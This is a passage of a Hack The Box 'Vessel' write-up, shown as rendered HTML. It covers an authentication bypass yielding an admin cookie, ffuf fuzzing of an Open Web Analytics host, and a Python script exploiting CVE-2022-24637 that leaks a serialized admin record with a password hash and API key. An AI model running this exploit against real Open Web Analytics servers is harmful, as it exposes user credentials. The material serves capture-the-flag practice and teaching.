font-style: inherit;">[</span>password<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">]=</span>1</span></code></pre></div>
<p>Will bypass authentication and generate a admin cookie.</p>
<p><img src="https://exploit.se/posts/2022-09-02-htb-writeup-vessel/images/vessel05.png" class="img-fluid"></p>
<p>Add the cookie to your local storage and browse to http://vessel.htb/admin and continue enumerating.</p>
<p>Pressing <code>Analytics</code> from the drop down bar in the top right corener forwards us to <code>openwebanalytics.vessel.htb</code> - add it to <code>/etc/hosts</code></p>
<p><img src="https://exploit.se/posts/2022-09-02-htb-writeup-vessel/images/vessel06.png" class="img-fluid"></p>
</section>
<section id="step-2" class="level3">
<h3 class="anchored" data-anchor-id="step-2">Step 2</h3>
<div class="sourceCode" id="cb7" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb7-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  vessel ffuf <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-c</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-w</span> /usr/share/wordlists/dirb/big.txt <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-u</span> http://openwebanalytics.vessel.htb/FUZZ <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-b</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"connect.sid=s%3AHesPODZMoKvc6J1HoyB3bOrgfQ94Oist.EJSYnEx%2Bzt9qCM4jC0sFUQiTfiZEWZf0AkfHELtFuaI"</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-fs</span> 26</span>
<span id="cb7-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">.htaccess</span>               [Status: 403, Size: 292, Words: 20, Lines: 10, Duration: 3231ms]</span>
<span id="cb7-3"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">.htpasswd</span>               [Status: 403, Size: 292, Words: 20, Lines: 10, Duration: 3567ms]</span>
<span id="cb7-4"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">api</span>                     [Status: 301, Size: 340, Words: 20, Lines: 10, Duration: 28ms]</span>
<span id="cb7-5"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">conf</span>                    [Status: 301, Size: 341, Words: 20, Lines: 10, Duration: 33ms]</span>
<span id="cb7-6"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">includes</span>                [Status: 301, Size: 345, Words: 20, Lines: 10, Duration: 34ms]</span>
<span id="cb7-7"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">modules</span>                 [Status: 301, Size: 344, Words: 20, Lines: 10, Duration: 28ms]</span>
<span id="cb7-8"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">plugins</span>                 [Status: 301, Size: 344, Words: 20, Lines: 10, Duration: 29ms]</span>
<span id="cb7-9"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">server-status</span>           [Status: 403, Size: 292, Words: 20, Lines: 10, Duration: 30ms]</span>
<span id="cb7-10"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">vendor</span>                  [Status: 301, Size: 343, Words: 20, Lines: 10, Duration: 33ms]</span></code></pre></div>
<p>Looking on the source code we see that it’s running <strong>version 1.7.3</strong>:</p>
<div class="sourceCode" id="cb8" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb8-1"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span>LINK <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">REL</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span>StyleSheet <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">HREF</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"http://openwebanalytics.vessel.htb/modules/base/css/owa.css?version=1.7.3"</span> <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">TYPE</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"text/css"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span></span></code></pre></div>
<p>Reading about version 1.7.3 I come across <a href="https://devel0pment.de/?p=2494">this post</a> covering CVE-2022-24637 where use of single quotes cause sensitive information to be printed in the php cache file. The cache files are stored here: <code>http://openwebanalytics.vessel.htb/owa-data/caches/1/owa_user/</code></p>
<p>And when no cache file is present we see this empty directory:</p>
<p><img src="https://exploit.se/posts/2022-09-02-htb-writeup-vessel/images/vessel07.png" class="img-fluid"></p>
<p>A cache file is generated once a user logs in to the application, and at the same time <code>index.php</code> is also generated to hide the files in the directory. We can generate cache files by doing invalid logins, however since <code>index.php</code> is created all we see is a blank page. We need to find a way to calculate the name of the cache file, and luckily it is quiet simple.</p>
<p>Here’s a short script I made to calculate the file name, and do a GET request to capture the base64 encoded data</p>
<div class="sourceCode" id="cb9" style="background: #f1f3f5;"><pre class="sourceCode python code-with-copy"><code class="sourceCode python"><span id="cb9-1"><span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">#!/usr/bin/env python3</span></span>
<span id="cb9-2"><span class="im" style="color: #00769E;
background-color: null;
font-style: inherit;">from</span> hashlib <span class="im" style="color: #00769E;
background-color: null;
font-style: inherit;">import</span> md5</span>
<span id="cb9-3"><span class="im" style="color: #00769E;
background-color: null;
font-style: inherit;">import</span> requests</span>
<span id="cb9-4"></span>
<span id="cb9-5">user_id <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">1</span></span>
<span id="cb9-6"><span class="cf" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">while</span> (user_id <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span> <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">10</span>):</span>
<span id="cb9-7">    unhashed_key <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"user_id"</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">+</span> <span class="bu" style="color: null;
background-color: null;
font-style: inherit;">str</span>(user_id)</span>
<span id="cb9-8">    cache_filename <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> md5(unhashed_key.encode()).hexdigest() <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">+</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">".php"</span></span>
<span id="cb9-9">    url <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"http://openwebanalytics.vessel.htb/owa-data/caches/1/owa_user/"</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">+</span> cache_filename</span>
<span id="cb9-10"></span>
<span id="cb9-11">    <span class="bu" style="color: null;
background-color: null;
font-style: inherit;">print</span>(user_id, <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"="</span>, url)</span>
<span id="cb9-12"></span>
<span id="cb9-13">    r <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> requests.session().get(url)</span>
<span id="cb9-14">    <span class="cf" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">if</span> r.status_code <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">!=</span> <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">404</span>:</span>
<span id="cb9-15">        <span class="bu" style="color: null;
background-color: null;
font-style: inherit;">print</span>(r.content)</span>
<span id="cb9-16">        <span class="cf" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">break</span></span>
<span id="cb9-17">    user_id <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> user_id <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">+</span> <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">1</span></span></code></pre></div>
<p>Running the script returns:</p>
<div class="sourceCode" id="cb10" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb10-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  vessel ./get-cache-file.py </span>
<span id="cb10-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">1</span> = http://openwebanalytics.vessel.htb/owa-data/caches/1/owa_user/c30da9265ba0a4704db9229f864c9eb7.php</span>
<span id="cb10-3"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">2</span> = http://openwebanalytics.vessel.htb/owa-data/caches/1/owa_user/ee140b966fcc6e58868032d658ae518e.php</span>
<span id="cb10-4"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">3</span> = http://openwebanalytics.vessel.htb/owa-data/caches/1/owa_user/333a7b2c4fe7e6a9e1028a51df3816d3.php</span>
<span id="cb10-5"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">4</span> = http://openwebanalytics.vessel.htb/owa-data/caches/1/owa_user/761b16cfc8c4c438b5cd6974f3313b91.php</span>
<span id="cb10-6"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">5</span> = http://openwebanalytics.vessel.htb/owa-data/caches/1/owa_user/277eabec41d80d89bc280c5b88ca18a8.php</span>
<span id="cb10-7"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">6</span> = http://openwebanalytics.vessel.htb/owa-data/caches/1/owa_user/f00dc1ccf8f0214684cd1b3722648bfd.php</span>
<span id="cb10-8"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">7</span> = http://openwebanalytics.vessel.htb/owa-data/caches/1/owa_user/8c43aebbdb615fce9c93df72bb956116.php</span>
<span id="cb10-9"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">8</span> = http://openwebanalytics.vessel.htb/owa-data/caches/1/owa_user/39e2305c9e511e28167c2b8644daf256.php</span>
<span id="cb10-10"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">9</span> = http://openwebanalytics.vessel.htb/owa-data/caches/1/owa_user/40f0efb1108be4366e279bb71efbed16.php</span></code></pre></div>
<p>However, as mentioned earlier, if we do a invalid login as user <strong>admin</strong> and run the script again, we’ll get the secret base64 data.</p>
<div class="sourceCode" id="cb11" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb11-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  vessel ./get-cache-file.py</span>
<span id="cb11-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">1</span> = http://openwebanalytics.vessel.htb/owa-data/caches/1/owa_user/c30da9265ba0a4704db9229f864c9eb7.php</span>
<span id="cb11-3"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">b</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'&lt;?php\\n/*Tzo4OiJvd2FfdXNlciI6NTp7czo0OiJuYW1lIjtzOjk6ImJhc2UudXNlciI7czoxMDoicHJvcGVydGllcyI7YToxMDp7czoyOiJpZCI7TzoxMjoib3dhX2RiQ29sdW1uIjoxMTp7czo0OiJuYW1lIjtOO3M6NToidmFsdWUiO3M6MToiMSI7czo5OiJkYXRhX3R5cGUiO3M6NjoiU0VSSUFMIjtzOjExOiJmb3JlaWduX2tleSI7TjtzOjE0OiJpc19wcmltYXJ5X2tleSI7YjowO3M6MTQ6ImF1dG9faW5jcmVtZW50IjtiOjA7czo5OiJpc191bmlxdWUiO2I6MDtzOjExOiJpc19ub3RfbnVsbCI7YjowO3M6NToibGFiZWwiO047czo1OiJpbmRleCI7TjtzOjEzOiJkZWZhdWx0X3ZhbHVlIjtOO31zOjc6InVzZXJfaWQiO086MTI6Im93YV9kYkNvbHVtbiI6MTE6e3M6NDoibmFtZSI7TjtzOjU6InZhbHVlIjtzOjU6ImFkbWluIjtzOjk6ImRhdGFfdHlwZSI7czoxMjoiVkFSQ0hBUigyNTUpIjtzOjExOiJmb3JlaWduX2tleSI7TjtzOjE0OiJpc19wcmltYXJ5X2tleSI7YjoxO3M6MTQ6ImF1dG9faW5jcmVtZW50IjtiOjA7czo5OiJpc191bmlxdWUiO2I6MDtzOjExOiJpc19ub3RfbnVsbCI7YjowO3M6NToibGFiZWwiO047czo1OiJpbmRleCI7TjtzOjEzOiJkZWZhdWx0X3ZhbHVlIjtOO31zOjg6InBhc3N3b3JkIjtPOjEyOiJvd2FfZGJDb2x1bW4iOjExOntzOjQ6Im5hbWUiO047czo1OiJ2YWx1ZSI7czo2MDoiJDJ5JDEwJG0wTDdwbVhiS054dlJWcUpIR1dKWS40a3ZxM0hsaEhjYlZoakFxRGt6b1pjVnUvc3c0UENXIjtzOjk6ImRhdGFfdHlwZSI7czoxMjoiVkFSQ0hBUigyNTUpIjtzOjExOiJmb3JlaWduX2tleSI7TjtzOjE0OiJpc19wcmltYXJ5X2tleSI7YjowO3M6MTQ6ImF1dG9faW5jcmVtZW50IjtiOjA7czo5OiJpc191bmlxdWUiO2I6MDtzOjExOiJpc19ub3RfbnVsbCI7YjowO3M6NToibGFiZWwiO047czo1OiJpbmRleCI7TjtzOjEzOiJkZWZhdWx0X3ZhbHVlIjtOO31zOjQ6InJvbGUiO086MTI6Im93YV9kYkNvbHVtbiI6MTE6e3M6NDoibmFtZSI7TjtzOjU6InZhbHVlIjtzOjU6ImFkbWluIjtzOjk6ImRhdGFfdHlwZSI7czoxMjoiVkFSQ0hBUigyNTUpIjtzOjExOiJmb3JlaWduX2tleSI7TjtzOjE0OiJpc19wcmltYXJ5X2tleSI7YjowO3M6MTQ6ImF1dG9faW5jcmVtZW50IjtiOjA7czo5OiJpc191bmlxdWUiO2I6MDtzOjExOiJpc19ub3RfbnVsbCI7YjowO3M6NToibGFiZWwiO047czo1OiJpbmRleCI7TjtzOjEzOiJkZWZhdWx0X3ZhbHVlIjtOO31zOjk6InJlYWxfbmFtZSI7TzoxMjoib3dhX2RiQ29sdW1uIjoxMTp7czo0OiJuYW1lIjtOO3M6NToidmFsdWUiO3M6MTM6ImRlZmF1bHQgYWRtaW4iO3M6OToiZGF0YV90eXBlIjtzOjEyOiJWQVJDSEFSKDI1NSkiO3M6MTE6ImZvcmVpZ25fa2V5IjtOO3M6MTQ6ImlzX3ByaW1hcnlfa2V5IjtiOjA7czoxNDoiYXV0b19pbmNyZW1lbnQiO2I6MDtzOjk6ImlzX3VuaXF1ZSI7YjowO3M6MTE6ImlzX25vdF9udWxsIjtiOjA7czo1OiJsYWJlbCI7TjtzOjU6ImluZGV4IjtOO3M6MTM6ImRlZmF1bHRfdmFsdWUiO047fXM6MTM6ImVtYWlsX2FkZHJlc3MiO086MTI6Im93YV9kYkNvbHVtbiI6MTE6e3M6NDoibmFtZSI7TjtzOjU6InZhbHVlIjtzOjE2OiJhZG1pbkB2ZXNzZWwuaHRiIjtzOjk6ImRhdGFfdHlwZSI7czoxMjoiVkFSQ0hBUigyNTUpIjtzOjExOiJmb3JlaWduX2tleSI7TjtzOjE0OiJpc19wcmltYXJ5X2tleSI7YjowO3M6MTQ6ImF1dG9faW5jcmVtZW50IjtiOjA7czo5OiJpc191bmlxdWUiO2I6MDtzOjExOiJpc19ub3RfbnVsbCI7YjowO3M6NToibGFiZWwiO047czo1OiJpbmRleCI7TjtzOjEzOiJkZWZhdWx0X3ZhbHVlIjtOO31zOjEyOiJ0ZW1wX3Bhc3NrZXkiO086MTI6Im93YV9kYkNvbHVtbiI6MTE6e3M6NDoibmFtZSI7TjtzOjU6InZhbHVlIjtzOjMyOiJjYzI1YzYzOWY0Mzk1MTA5ZTAzODE3ODRiN2VjODQwZSI7czo5OiJkYXRhX3R5cGUiO3M6MTI6IlZBUkNIQVIoMjU1KSI7czoxMToiZm9yZWlnbl9rZXkiO047czoxNDoiaXNfcHJpbWFyeV9rZXkiO2I6MDtzOjE0OiJhdXRvX2luY3JlbWVudCI7YjowO3M6OToiaXNfdW5pcXVlIjtiOjA7czoxMToiaXNfbm90X251bGwiO2I6MDtzOjU6ImxhYmVsIjtOO3M6NToiaW5kZXgiO047czoxMzoiZGVmYXVsdF92YWx1ZSI7Tjt9czoxMzoiY3JlYXRpb25fZGF0ZSI7TzoxMjoib3dhX2RiQ29sdW1uIjoxMTp7czo0OiJuYW1lIjtOO3M6NToidmFsdWUiO3M6MTA6IjE2NTAyMTE2NTkiO3M6OToiZGF0YV90eXBlIjtzOjY6IkJJR0lOVCI7czoxMToiZm9yZWlnbl9rZXkiO047czoxNDoiaXNfcHJpbWFyeV9rZXkiO2I6MDtzOjE0OiJhdXRvX2luY3JlbWVudCI7YjowO3M6OToiaXNfdW5pcXVlIjtiOjA7czoxMToiaXNfbm90X251bGwiO2I6MDtzOjU6ImxhYmVsIjtOO3M6NToiaW5kZXgiO047czoxMzoiZGVmYXVsdF92YWx1ZSI7Tjt9czoxNjoibGFzdF91cGRhdGVfZGF0ZSI7TzoxMjoib3dhX2RiQ29sdW1uIjoxMTp7czo0OiJuYW1lIjtOO3M6NToidmFsdWUiO3M6MTA6IjE2NTAyMTE2NTkiO3M6OToiZGF0YV90eXBlIjtzOjY6IkJJR0lOVCI7czoxMToiZm9yZWlnbl9rZXkiO047czoxNDoiaXNfcHJpbWFyeV9rZXkiO2I6MDtzOjE0OiJhdXRvX2luY3JlbWVudCI7YjowO3M6OToiaXNfdW5pcXVlIjtiOjA7czoxMToiaXNfbm90X251bGwiO2I6MDtzOjU6ImxhYmVsIjtOO3M6NToiaW5kZXgiO047czoxMzoiZGVmYXVsdF92YWx1ZSI7Tjt9czo3OiJhcGlfa2V5IjtPOjEyOiJvd2FfZGJDb2x1bW4iOjExOntzOjQ6Im5hbWUiO3M6NzoiYXBpX2tleSI7czo1OiJ2YWx1ZSI7czozMjoiYTM5MGNjMDI0N2VjYWRhOWEyYjhkMjMzOGI5Y2E2ZDIiO3M6OToiZGF0YV90eXBlIjtzOjEyOiJWQVJDSEFSKDI1NSkiO3M6MTE6ImZvcmVpZ25fa2V5IjtOO3M6MTQ6ImlzX3ByaW1hcnlfa2V5IjtiOjA7czoxNDoiYXV0b19pbmNyZW1lbnQiO2I6MDtzOjk6ImlzX3VuaXF1ZSI7YjowO3M6MTE6ImlzX25vdF9udWxsIjtiOjA7czo1OiJsYWJlbCI7TjtzOjU6ImluZGV4IjtOO3M6MTM6ImRlZmF1bHRfdmFsdWUiO047fX1zOjE2OiJfdGFibGVQcm9wZXJ0aWVzIjthOjQ6e3M6NToiYWxpYXMiO3M6NDoidXNlciI7czo0OiJuYW1lIjtzOjg6Im93YV91c2VyIjtzOjk6ImNhY2hlYWJsZSI7YjoxO3M6MjM6ImNhY2hlX2V4cGlyYXRpb25fcGVyaW9kIjtpOjYwNDgwMDt9czoxMjoid2FzUGVyc2lzdGVkIjtiOjE7czo1OiJjYWNoZSI7Tjt9*/\\n?&gt;'</span></span>
<span id="cb11-4"></span>
<span id="cb11-5"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  vessel echo <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"Tzo [... snip ...] Tjt9"</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">base64</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-d</span></span>
<span id="cb11-6"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">O:8:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"owa_user"</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">:5:{s:4:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"name"</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">s:9:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"base.user"</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">s:10:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"properties"</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">a:10:{s:2:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"id"</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">O:12:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"owa_dbColumn"</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">:11:{s:4:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"name"</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">N</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">s:5:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"value"</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">s:1:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"1"</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">s:9:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"data_type"</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">s:6:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"SERIAL"</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">s:11:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"foreign_key"</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">N</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">s:14:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"is_primary_key"</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">b:0</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">s:14:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"auto_increment"</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">b:0</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">s:9:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"is_unique"</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">b:0</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">s:11:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"is_not_null"</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">b:0</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">s:5:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"label"</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">N</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">s:5:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"index"</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">N</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">s:13:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"default_value"</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">N</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">}</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">s:7:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"user_id"</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">O:12:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"owa_dbColumn"</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">:11:{s:4:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"name"</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">N</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">s:5:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"value"</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">s:5:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"admin"</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">s:9:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"data_type"</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">s:12:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"VARCHAR(255)"</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">s:11:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"foreign_key"</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">N</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">s:14:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"is_primary_key"</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">b:1</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">s:14:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"auto_increment"</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">b:0</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">s:9:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"is_unique"</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">b:0</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">s:11:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"is_not_null"</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">b:0</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">s:5:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"label"</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">N</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="ex" style="color: null;
background-color: null;
